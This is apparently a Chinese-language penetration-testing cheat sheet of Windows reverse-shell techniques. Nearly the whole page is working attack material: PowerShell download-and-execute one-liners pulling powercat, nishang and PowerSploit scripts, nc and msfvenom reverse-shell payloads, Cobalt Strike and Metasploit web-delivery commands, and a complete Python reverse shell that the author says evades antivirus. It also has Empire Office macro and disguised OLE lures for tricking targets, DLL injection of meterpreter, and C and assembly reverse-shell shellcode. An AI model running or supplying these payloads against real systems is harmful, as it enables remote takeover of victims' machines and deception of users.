# Windows反弹备忘录

### **powercat**

#### ①用IEX下载远程PS1脚本回来权限绕过执行

使用powershell执行

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.2.103 -p 4444 -e cmd
```

#### ② powercat下载地址：https://github.com/besimorhino/powercat 下载到本地执行

powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat

```powershell
Import-Module ./powercat.ps1 # 先执行powercat脚本导入模块
powercat -c 192.168.159.134 -p 6666 -e cmd  # 再执行反弹shell
```

**或**

```powershell
# 攻击者(192.168.159.134)开启监听：
nc -lvp 6666
# 或者使用powercat监听
powercat -l -p 6666

# 目标机反弹cmd shell：
powershell IEX (New-Object System.Net.Webclient).DownloadString
('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
powercat -c 192.168.159.134 -p 6666 -e cmd
```



### NC

```shell
nc 192.168.2.103 4444 -e c:\windows\system32\cmd.exe  # 服务器端反弹(目标主机)
```

### nishang

Nishang下载地址：https://github.com/samratashok/nishang

Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell

将nishang下载到攻击者本地，在目标机使用powershell执行以下命令

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.2.103 -port 4444
```

### Reverse UDP shell

攻击机监听 `nc -lvup 4444`

利用上面下载的还是放在攻击机上在目标机中powershell执行以下命令

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.2.103/nishang/Shells/Invoke-PowerShellUdp.ps1');

Invoke-PowerShellUdp -Reverse -IPAddress 192.168.2.103 -port 4444
```

### Reverse TCP shell

```powershell
# 攻击者(192.168.159.134)开启监听：
nc -lvp 6666

# 目标机执行：
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666

# 或者将nishang下载到攻击者本地：
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666
```

### Reverse ICMP shell

```powershell
# 首先攻击端下载icmpsh_m.py文件
https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1

# 攻击者(192.168.159.134)执行
sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包
python icmpsh_m.py 192.168.159.134 192.168.159.138 #开启监听

# 目标机(192.168.159.138)执行
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.159.134
```

### MSF

我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们需要的各类反弹一句话payload的路径信息

```
msfvenom -l payloads | grep 'cmd/windows/reverse'   # 攻击机查找攻击payload
```

依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可

```shell
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.2.103 LPORT=4444  #  生成payload,并将生成内容复制粘贴到目标主机运行
```

### Cobalt strike

Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvR32等进行反弹shell，类似metasploit的web_delivery模块

①运行服务端

```shell
./teamserver 192.168.2.103 123 #123为连接密码
```

②运行客户端：

Windows运行cobaltstrike.jar #用户名随便输入 密码123

![1598437160](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437160.png)

③开启监听:

点击Cobalt Strike->Listeners

payload可选择windows/beacon_http/reverse_http

说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器

![1598437131](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437131.png)

④生成powershell payload:

点击Attack -> Web Drive-by -> Scripted Web Delivery

Type选择 powershell

![1598437118](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437118.png)

生成的payload：

```shell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.2.103:8887/a'))"
```

⑤生成代码已经给出了，在windows上执行

![1598437102](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437102.png)

![1598437091](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437091.png)

### python反弹cmd

可以用python编写反弹cmd的代码。参考大佬的代码改写而成，更简单使用一些

```python
# -*- coding:utf-8 -*-
import os
import select
import socket
import sys
import subprocess

def ReserveConnect(addr, port):
    '''反弹连接shell'''
    try:
        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.connect((addr,port))
    except Exception as reason:
        print ('[-] Failed to Create Socket : %s'%reason)
        exit(0)
    rlist = [shell]
    wlist = []
    elist = [shell]
    while True:
        shell.send("cmd:")
        rs,ws,es = select.select(rlist,wlist,wlist)
        for sockfd in rs:
            if sockfd == shell:
                command = shell.recv(1024)
                if command == 'exit':
                    shell.close()
                    break
                result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
                shell.sendall(result.decode("GB2312").encode("UTF-8"))

# 主函数运行
def run():
    if len(sys.argv)<3:
        print('Usage: python reverse.py [IP] [PORT]')
    else:
        url = sys.argv[1]
        port = int(sys.argv[2])
        ReserveConnect(url,port)

if __name__ == '__main__':
    run()
```

考虑实战中可能没有python环境
可以先在本地上使用pyinstaller将改文件打包为exe文件，实战中直接上传exe运行即可

```python
pythinstaller -Fw  reverse.py
```

被攻击端运行命令

```python
reverse.exe 192.168.203.140 4455
```

攻击端用nc监听，即可反弹cmd。实际测试bypass av效果也比较好

![1734768-2c2296daae714cb0](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1734768-2c2296daae714cb0.webp)

#### 自定义powershell函数反弹shell

利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell

```powershell
# 攻击者(192.168.159.134) 开启监听 
nc -lvp 6666

# 目标机执行 
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.159.134',6666);$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Empire 结合office反弹shell

Empire(https://github.com/EmpireProject/Empire ) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell

#### 利用office 宏反弹shell

```shell
# 攻击者(192.168.159.134)开启监听:
uselistener http
execute
back
usestager windows/macro http #生成payload
execute
```

![t01ebd92ae5c2752d1a](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01ebd92ae5c2752d1a.png)

![t01c424d48628a2722b](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01c424d48628a2722b.png)

生成/tmp/macro 攻击代码后，新建一个word 创建宏

![t017c0553a3aab1b9de](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t017c0553a3aab1b9de.png)

点击“文件”-“宏”-“创建”，删除自带的脚本，复制进去/tmp/macro文件内容，并保存为“Word 97-2003文档(*.doc)”或者“启用宏的Word 文档(*.docm)”文件，当诱导目标打开，执行宏后，即可成功反弹shell：
说明:需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏”

![t0110d78f8b6dc573b7](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t0110d78f8b6dc573b7.png)

![t0153edfb39e2d25b0e](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t0153edfb39e2d25b0e.png)

### 利用office OLE对象插入bat文件反弹shell

```shell
# 攻击者(192.168.159.134)开启监听 并生成bat文件payload：
listeners
usestager windows/launcher_bat http
execute
```

![t017b89a4956e058dd2](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t017b89a4956e058dd2.png)

在word中“插入”-“对象”-“由文件创建” 处，插入launcher.bat文件，可更改文件名称和图标，进行伪装，当诱导目标点击launcher_lltest.xls文件，执行后，即可成功反弹shell：

![t019fac2fa169e37faf](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t019fac2fa169e37faf.png)

![t01df44007f3dfd7c7f](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01df44007f3dfd7c7f.png)

![t01d3703513e3d73d1a](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01d3703513e3d73d1a.png)

### PowerSploit DLL注入反弹shell

PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。
利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell

1）msfvenom生成dll后门

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.134 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll

# 说明：目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp
```

![t01b4caf8412924dfcc](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01b4caf8412924dfcc.png)

2）metasploit 设置payload 开启监听

```shell
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.159.134
set LPORT 6667
exploit
```

![t012d0e9a74a7f468ca](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t012d0e9a74a7f468ca.png)

3）powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门
首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程

目标机执行:

```powershell
Get-Process #选择要注入的进程
IEX (New-Object Net.WebClient).DownloadString("http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")
Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll
```

![t013b399a39f86d7729](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t013b399a39f86d7729.png)

![t01121eca1107d335a1](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01121eca1107d335a1.png)

![t017f8aa99b2a307bcf](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t017f8aa99b2a307bcf.png)

![t01ebe09a11da4904bc](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01ebe09a11da4904bc.png)

### metasploit反弹shell

利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell

攻击者(192.168.159.134)：

```shell
use exploit/multi/script/web_delivery
set PAYLOAD windows/meterpreter/reverse_tcp
set target 2
set LHOST 192.168.159.134
set LPORT 6666
exploit
目标机执行：
powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();
$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring('http://192.168.159.134:8080/4iNSwaMtwWjm');
```

![t01059c412e75c4ff00](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01059c412e75c4ff00.png)

![t0154717c97e799d852](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t0154717c97e799d852.png)

### 内存shellcode执行

通过shellcode直接调用glibc或者syscall完成反弹shell。 

1）C代码

```c
#include<sys/socket.h>   //构造socket所需的库
#include<netinet/in.h>  //定义sockaddr结构
int main()
{
  char *shell[2];       //用于execv调用
  int soc,remote;    //文件描述符句柄
  struct sockaddr_in serv_addr; //保存IP/端口值的结构
 
  serv_addr.sin_addr.s_addr=0x6400A8C0;  //将socket的地址设置为所有本地地址
  serv_addr.sin_port=0xBBBB;  //设置socket的端口48059
  serv_addr.sin_family=2;   //设置协议族：IP
  soc=socket(2,1,0);
  remote=connect(soc,(struct sockaddr *)&serv_addr,0x10);
 
  dup2(soc,0);   //将stdin连接client
  dup2(soc,1);   //将stdout连接client
  dup2(soc,2);   //将strderr连接到client
  shell[0]="/bin/sh";   //execve的第一个参数
  shell[1]=0;           //数组的第二个元素为NULL,表示数组结束
  execv(shell[0],shell,NULL);   //建立一个shell
}
```

2）汇编语言代码

```c
section .text
global _start
_start:
xor eax,eax ;清空eax
xor ebx,ebx ;清空ebx
xor edx,edx  ;清空edx
 
;soc=socket(2,1,0)
push eax  ;socket的第三个参数：0
push byte 0x1 ;socket的第二个参数：1
push byte 0x2 ;socket的第一个参数：2
mov ecx,esp ;将数组的地址设置为socketcall的第二个参数
inc bl  ;将socketcall的第一个参数设置为1
mov al,102  ;调用socketcall,分支调用号为1：SYS_SOCKET
int 0x80  ;进入核心态，执行系统调用
mov esi,eax ;将返回值(eax)存储到esi中（即soc句柄）
 
;remote=connect(soc,(struct sockaddr *)&serv_addr,0x10)
push edx; ;仍然为0，用来作为接下来压栈的数据的结束符
push long 0x6400A8C0  ;本节代码中新增，将地址反序得到的十六进制压栈
push word 0xBBBB  ;将端口压栈，十进制为48059
xor ecx,ecx ;清空ecx，以便保存结构的sa_family字段
mov cl,2  ;将ecx的地位字节，设置为2
push word cx  ;建立结构，包括端口和sin.family,共四个字节
mov ecx,esp ;将结构的地址（在栈上）复制到ecx
push byte 0x10  ;connect参数的开始，将16压栈
push ecx  ;在栈上保存结构的地址
push esi  ;将服务器文件描述符esi保存到栈
mov ecx,esp ;将参数数组的地址保存到ecx（socketcall的第二个参数）
mov bl,3  ;将bl设置为3，socketcall的第一个参数
mov al,102  ;调用socketcall，分支调用号为3：SYS_CONNECT
int 0x80  ;进入核心态，执行系统调用
 
mov ebx,esi ;将客户端的soc文件描述符复制到ebx
;dup2(soc,0)
xor ecx,ecx ;清空ecx
mov al,63 ;将系统调用的第一个参数设置为63：dup
int 0x80  ;进行系统调用
 
;dup2(client,1)
inc ecx ;ecx设置为1
mov al,63 ;准备进行系统调用:dup2:63
int 0x80  ;进行系统调用
 
;dup2(client,2)
inc ecx ;ecx设置为2
mov al,63 ;准备进行系统调用:dup2:63
int 0x80 ;进行系统调用
 
;标准的execv("/bin/sh"...
push edx
push long 0x68732f2f
push long 0x6e69622f
mov ebx,esp
push edx
push ebx
mov ecx,esp
mov al,0x0b
int 0x80
```

注意，push long 0x6400A8C0 这里就是IP地址，出现了00，在网络传输中会被截断

```shell
nasm -f elf reverse_port_asm.asm
ld -o reverse_port_asm reverse_port_asm.o
# 然后抽取十六进制代码
objdump -d ./reverse_port_asm
# 得到shellcode 
```

### 通过dll进程注入执行反弹shell

PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。
利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell

```powershell
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.134 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll  # msfvenom生成dll后门

# metasploit设置payload开启监听

IEX (New-Object Net.WebClient).DownloadString("http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll  # powershell下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门
```

本质上，dll进程注入和上一节介绍的shellcode执行的原理的是一样的

### dns_shell & icmp_shell

本质上说，dns和icmp是一种网络通信方式，使用任何语言都可以借助这两种网络通信方式进行反弹shell交互。

但是我们知道，dns和icmp和tcp/udp不一样，它们都不是直连的网络信道，而是需要通过一个第三方进行消息中转

- **dns（udp直连模式）** https://github.com/ahhh/Reverse_DNS_Shell
  - control server将指令封装成dns包格式，通过udp53直接发送给client
  - victim client从udp53接收到dns包后进行解析，从中提取并解码得到指令，并将执行结果封装成dns包格式，通过udp53返回给server
- **dns（authoritative DNS server转发模式）** https://github.com/iagox86/dnscat2
  - victim client配置好dns resolve（domain nameserver），之后将所有的执行结果和指令请求都以正常dns query的形式发送给local DNS server，随后通过dns递归查询最终会发送到攻击者控制的domain nameserver上
  - control server从dns query中过滤出反弹shell相关的会话通信，并按照dns response的形式返回主控指令